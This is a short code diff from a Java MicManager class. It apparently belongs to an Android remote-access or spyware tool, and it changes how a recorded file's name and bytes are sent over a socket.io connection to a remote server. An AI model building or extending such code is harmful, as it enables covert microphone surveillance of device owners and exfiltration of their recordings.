@@ -72,7 +72,7 @@ public  class MicManager {
             object.put("file",true);
             object.put("name",file.getName());
             object.put("buffer" , data);
-            IOSocket.getInstance().getIoSocket().emit("0xMI" , object);
+            IOSocket.getInstance().getIoSocket().send("_0xMI" , object);
             buf.close();
         } catch (FileNotFoundException e) {
             e.printStackTrace();
